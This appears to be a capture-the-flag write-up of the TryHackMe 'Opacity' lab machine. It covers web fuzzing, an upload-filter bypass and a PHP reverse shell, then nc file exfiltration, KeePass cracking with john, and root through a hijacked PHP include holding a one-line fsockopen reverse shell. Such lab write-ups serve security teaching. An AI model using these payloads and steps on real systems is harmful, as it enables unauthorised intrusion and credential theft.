[Opacity](https://tryhackme.com/room/opacity) machine on [TryHackMe](https://tryhackme.com/) is boot-to-root machine requires exploiting a file upload vulnerability to gain an initial foothold via a reverse shell. Once inside, we discover a database file from a known password manager. Cracking it reveals credentials that grant SSH access as a regular user.
For privilege escalation, we identify a background process executing a script that includes another file we have permission to modify. By injecting a reverse shell into this file, we escalate to root privileges.

## Initial foothold

Port 80 presents a web portal with a login form. I tried a bunch of default credentials, hoping for an easy win, but no luck this time!
![Web](../assets/img/posts/2025-02-27-thm-writeup-opacity/image.png)

Next, we move on to discovering directories on the web

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://opacity.thm/FUZZ -c -s

css
cloud
server-status

```

We came across 'cloud,' which definitely looks promising. Visiting found path reveals the following file upload page

![Upload panel](../assets/img/posts/2025-02-27-thm-writeup-opacity/image-1.png)

On this page, we find an option to upload an image from an external source. To investigate its behavior, we set up a listener and input our IP as the external URL with a fake image path e.g `http://10.10.95.60:8080/test.jpg` and set a listener on our attacker machine to see what we get:

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# nc -nvlp 8080
listening on [any] 8080 ...
connect to [10.10.95.60] from (UNKNOWN) [10.10.17.15] 43590
GET /test.jpg HTTP/1.1
User-Agent: Wget/1.20.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.95.60:8080
Connection: Keep-Alive
```

We notice that the server runs a wget command against our listener and hangs until we terminate it. Gathering more information, we confirm that the server is running Apache.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# whatweb http://opacity.thm/cloud/
http://opacity.thm/cloud/ [200 OK] Apache[2.4.41], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.17.15], Title[Opacity Storage]
```

Next, we crete a fake .jpg file and trying to upload works even if the signature is not correct:

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# echo "test" > test.jpg

â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

![alt text](../assets/img/posts/2025-02-27-thm-writeup-opacity/image-2.png)

And we discover that files are uploaded as is to the `/cloud/images` path

![alt text](../assets/img/posts/2025-02-27-thm-writeup-opacity/image-3.png)

Trying the same approach with a simple PHP shell doesnâ€™t work, the page just reloads. This suggests there may be some file extension filtering in place.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# echo "<?php system(\$_GET['cmd']) ?>" > shell.php
```

Since the server accepts .jpg files, let's try bypassing the restriction by using the same PHP shell path but tricking the server into thinking it's a .jpg by appending `#`.

```bash
  http://10.10.95.60:8080/shell.php#.jpg
```

![alt text](../assets/img/posts/2025-02-27-thm-writeup-opacity/image-4.png)

When sending we get a hit on our server and php file is uploaded

![alt text](../assets/img/posts/2025-02-27-thm-writeup-opacity/image-5.png)

However, accessing `/cloud/images/shell.php?cmd=id` doesnâ€™t produce any results.

Let's try uploading a reverse shell and listening for a connection. This will help us determine if the server executes the fetched file (e.g., via `exec` or a similar function) that is being fetched via `wget`.

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~]
â””â”€# cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

Set IP and PORT to our attacking machine IP and port to 5555:

```bash
$ip = '10.10.95.60';
$port = 5555;  
```

Then repeating the step by using `http://10.10.95.60:8080/shell.php#.jpg` on upload field we successfully got a reverse shell as `www-data`:

![alt text](../assets/img/posts/2025-02-27-thm-writeup-opacity/image-6.png)

```bash
$ whoami
www-data
$ python3 -c "import pty;pty.spawn('/bin/bash')"       
www-data@opacity:/$ export TERM=xterm
export TERM=xterm
www-data@opacity:/$ 
```

But being `www-data` we cannot read the flag

![alt text](../assets/img/posts/2025-02-27-thm-writeup-opacity/image-7.png)

After inspecing filesystem for some time we found `dataset.kdbx` under `/opt` directory, which is a keepass database file:

![alt text](../assets/img/posts/2025-02-27-thm-writeup-opacity/image-8.png)

We download it by using `nc`. We start a listener on our attacking machine

```bash
nc -nvlp 6666 > dataset.kdbx
```

And send file from victim as follows:

```bash
nc 10.10.123.25 6666 < dataset.kdbx
```

![alt text](../assets/img/posts/2025-02-27-thm-writeup-opacity/image-9.png)

Having the file on our attacking machine, we can now attempt to brute force it using `john`, but first we need to convert it to correct format for cracking with `keepass2john`:

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]
â””â”€# file dataset.kdbx 
dataset.kdbx: Keepass password database 2.x KDBX
                                                                   
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]
â””â”€# /usr/sbin/keepass2john dataset.kdbx > hash
                                                                   
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]
â””â”€# cat hash 
dataset:$keepass$*2*100000*0*211[REDACTED]36b4
```

Now we can proceed with `john` for trying to crack it. We'll use `rockyou` wordlist:

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]
â””â”€# /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt hash

```

We successfully obtained its password and can proceed to opening `kdbx` file using KeePassXC.
Inside we found a password for `sysadmin` user.

![alt text](../assets/img/posts/2025-02-27-thm-writeup-opacity/image-10.png)

Let's verify if that's a valid one using it for logging in via SSH with `sysadmin`

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]
â””â”€# ssh sysadmin@opacity.thm 

sysadmin@opacity:~$ cat local.txt 
6******************************2

```

Seems it is! And we got flag for local user!

## Privilege escalation

In the `sysadmin` home directory, we find a `scripts` folder containing a `lib` folder and a `script.php` file. While we have full permissions over the `lib` folder, we donâ€™t have access to modify `script.php`

```bash
sysadmin@opacity:~/scripts$ ls -la
total 16
drwxr-xr-x 3 root     root     4096 Jul  8  2022 .
drwxr-xr-x 6 sysadmin sysadmin 4096 Feb 22  2023 ..
drwxr-xr-x 2 sysadmin root     4096 Jul 26  2022 lib
-rw-r----- 1 root     sysadmin  519 Jul  8  2022 script.php
```

Inspecting file `script.php`, it shows it does some backup but it also uses `require_once` on a file called `backup.inc.php` under `lib` folder:

```php
sysadmin@opacity:~/scripts$ cat script.php 
<?php

//Backup of scripts sysadmin folder
require_once('lib/backup.inc.php');
zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
echo 'Successful', PHP_EOL;

//Files scheduled removal
$dir = "/var/www/html/cloud/images";
if(file_exists($dir)){
    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
    foreach ( $ri as $file ) {
        $file->isDir() ?  rmdir($file) : unlink($file);
    }
}
?>
```

Unfortunately `sysadmin` is not owner of `backup.inc.php`

```bash
sysadmin@opacity:~/scripts/lib$ ls -la
total 132
drwxr-xr-x 2 sysadmin root  4096 Jul 26  2022 .
drwxr-xr-x 3 root     root  4096 Jul  8  2022 ..
-rw-r--r-- 1 root     root  9458 Jul 26  2022 application.php
-rw-r--r-- 1 root     root   967 Jul  6  2022 backup.inc.php
-rw-r--r-- 1 root     root 24514 Jul 26  2022 bio2rdfapi.php
-rw-r--r-- 1 root     root 11222 Jul 26  2022 biopax2bio2rdf.php
-rw-r--r-- 1 root     root  7595 Jul 26  2022 dataresource.php
-rw-r--r-- 1 root     root  4828 Jul 26  2022 dataset.php
-rw-r--r-- 1 root     root  3243 Jul 26  2022 fileapi.php
-rw-r--r-- 1 root     root  1325 Jul 26  2022 owlapi.php
-rw-r--r-- 1 root     root  1465 Jul 26  2022 phplib.php
-rw-r--r-- 1 root     root 10548 Jul 26  2022 rdfapi.php
-rw-r--r-- 1 root     root 16469 Jul 26  2022 registry.php
-rw-r--r-- 1 root     root  6862 Jul 26  2022 utils.php
-rwxr-xr-x 1 root     root  3921 Jul 26  2022 xmlapi.php
```

But as we previously saw, we had all permissions on `lib` folder. This allows us to remove or create new files on it, so we can remove `backup.inc.php` and create a new one.
Knowing that, we'll create a file which executes a php reverse shell to our attacking machine:

```php
sysadmin@opacity:~/scripts/lib$ rm -rf backup.inc.php 
sysadmin@opacity:~/scripts/lib$ echo "<?php \$sock=fsockopen(\"10.10.203.108\",5555);exec(\"/bin/sh -i <&3 >&3 2>&3\"); ?>" > backup.inc.php
sysadmin@opacity:~/scripts/lib$ cat backup.inc.php 
<?php $sock=fsockopen("10.10.203.108",5555);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

Now, we just need to confirm that `script.php` file gets executed somehow so our file gets executed as well. Checking `sysadmin`'s crontab reveals nothing, so let's dig deeper. Using `pspy` we can check for any processes running under a different user:

***Attacker***

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]
â””â”€# wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
...
python -m http.server 8080
```

***Victim***

```bash
cd /tmp && wget http://10.10.203.108:8080/pspy64 && chmod +x pspy64
./pspy64
```

Yikes! We found the missing piece, `script.php` is being executed by `root`!

![alt text](../assets/img/posts/2025-02-27-thm-writeup-opacity/image-11.png)

Finding means that our changed `backup.inc.php` file should be already being executed. So all indicates that if we run a listener on port 5555 we should be getting root reverse shell due to file being run as `root` user and be able to get the flag.

Since `script.php` runs as `root`, our modified `backup.inc.php` should already be executing. Everything points to the fact that if we set up a listener on port 5555, we should receive a root reverse shell which will grant us access as `root` and hence to proof flag

*Note: After inspecting pspy output for some time it looks like runs are being made every 5 minutes. So shell would pop after that time passes by.*

```bash
â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop]
â””â”€# nc -nvlp 5555
listening on [any] 5555 ...
